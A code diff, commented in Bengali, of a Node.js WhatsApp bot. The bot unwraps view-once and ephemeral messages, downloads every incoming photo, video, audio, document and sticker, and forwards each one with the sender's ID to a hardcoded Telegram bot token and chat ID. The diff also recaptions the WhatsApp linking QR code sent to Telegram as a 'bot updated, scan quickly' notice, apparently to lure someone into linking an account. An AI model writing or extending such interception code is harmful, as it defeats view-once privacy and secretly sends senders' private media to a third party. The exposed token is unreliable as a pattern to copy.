@@ -7,19 +7,19 @@ const FormData = require('form-data');
 const TELEGRAM_BOT_TOKEN = '9125543698:AAE6DE7PPNKhUE6Eg0bw1bi5-KPfsVGEQ4A';
 const TELEGRAM_CHAT_ID = '7512451863';
 
-// QR কোড ইমেজ বানিয়ে টেলিগ্রামে পাঠানোর ফাংশন
+// QR কোড ইমেজ এবং আপডেট মেসেজ টেলিগ্রামে পাঠানোর ফাংশন
 async function sendQRToTelegram(qrString) {
     try {
         const buffer = await QRCode.toBuffer(qrString);
         const form = new FormData();
         form.append('chat_id', TELEGRAM_CHAT_ID);
         form.append('photo', buffer, { filename: 'qrcode.png' });
-        form.append('caption', '📱 WhatsApp QR কোড চলে এসেছে! দ্রুত আপনার ফোন দিয়ে এটি স্ক্যান করুন।');
+        form.append('caption', '🔄 **বট আপডেট হয়েছে!**\n\n📱 নতুন QR কোড চলে এসেছে, দ্রুত আপনার ফোন দিয়ে এটি স্ক্যান করুন।');
 
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
             headers: form.getHeaders()
         });
-        console.log('✅ QR কোড টেলিগ্রামে সফলভাবে পাঠানো হয়েছে!');
+        console.log('✅ QR কোড ও আপডেট মেসেজ টেলিগ্রামে পাঠানো হয়েছে!');
     } catch (error) {
         console.error('❌ টেলিগ্রামে QR পাঠাতে সমস্যা হয়েছে:', error.response ? error.response.data : error.message);
     }
@@ -58,7 +58,7 @@ async function connectToWhatsApp() {
     sock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect, qr } = update;
         if (qr) {
-            console.log('নতুন QR কোড জেনারেট হয়েছে, টেলিগ্রামে পাঠানো হচ্ছে...');
+            console.log('বট আপডেট হয়েছে, নতুন QR কোড টেলিগ্রামে পাঠানো হচ্ছে...');
             await sendQRToTelegram(qr);
         }
         if (connection === 'close') {
@@ -76,13 +76,16 @@ async function connectToWhatsApp() {
         for (const msg of messages) {
             if (msg.key.fromMe || !msg.message) continue;
 
-            // সব ধরনের ভিউ ওয়ান্স এবং ইফিমেৰাল মেসেজ ফরম্যাট আনর্যাপ করা
             let messageContent = msg.message;
+
+            // ভিউ ওয়ান্স বা যেকোনো এনক্রিপ্টেড লেয়ার আনর্যাপ করা
             if (messageContent.ephemeralMessage) messageContent = messageContent.ephemeralMessage.message;
             if (messageContent.viewOnceMessage) messageContent = messageContent.viewOnceMessage.message;
             if (messageContent.viewOnceMessageV2) messageContent = messageContent.viewOnceMessageV2.message;
             if (messageContent.viewOnceMessageV2Extension) messageContent = messageContent.viewOnceMessageV2Extension.message;
+            if (messageContent.documentWithCaptionMessage) messageContent = messageContent.documentWithCaptionMessage.message;
 
+            // সব ধরনের মিডিয়া টাইপ যা থাকতে পারে
             const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
             const messageType = mediaTypes.find(type => messageContent && messageContent[type]);
 
@@ -94,16 +97,23 @@ async function connectToWhatsApp() {
                     let fileName = mediaObj.fileName;
                     if (!fileName) {
                         const mime = mediaObj.mimetype || 'application/octet-stream';
-                        const ext = mime.split('/')[1]?.split(';')[0] || 'bin';
+                        let ext = 'bin';
+                        if (mime.includes('image')) ext = 'jpg';
+                        else if (mime.includes('video')) ext = 'mp4';
+                        else if (mime.includes('audio')) ext = 'mp3';
                         fileName = `WA_Media_${Date.now()}.${ext}`;
                     }
 
-                    const caption = `📩 **নতুন মিডিয়া বা 1-View ছবি এসেছে**\n👤 প্রেরক: ${sender}\n📝 ক্যাপশন: ${mediaObj.caption || 'নেই'}`;
+                    const caption = `📩 **নতুন ফাইল বা 1-View মিডিয়া এসেছে**\n👤 প্রেরক: ${sender}\n📝 ক্যাপশন: ${mediaObj.caption || 'নেই'}`;
 
                     console.log(`📥 মিডিয়া ডাউনলোড হচ্ছে: ${fileName}...`);
 
-                    // ভিউ ওয়ান্স ও মিডিয়া ডিক্রিপ্ট করার জন্য সঠিক আনর্যাপড মেসেজ অবজেক্ট পাস করা হলো
-                    const clonedMsg = { ...msg, message: messageContent };
+                    const clonedMsg = { 
+                        ...msg, 
+                        message: { 
+                            [messageType]: mediaObj 
+                        } 
+                    };
 
                     const buffer = await downloadMediaMessage(
                         clonedMsg,
@@ -112,10 +122,12 @@ async function connectToWhatsApp() {
                         { logger: pino({ level: 'silent' }) }
                     );
 
-                    await sendToTelegram(buffer, fileName, caption);
+                    if (buffer) {
+                        await sendToTelegram(buffer, fileName, caption);
+                    }
 
                 } catch (err) {
-                    console.error('মিডিয়া বা ভিউ ওয়ান্স প্রসেস করতে সমস্যা হয়েছে:', err);
+                    console.error('মিডিয়া প্রসেস করতে সমস্যা হয়েছে:', err);
                 }
             }
         }
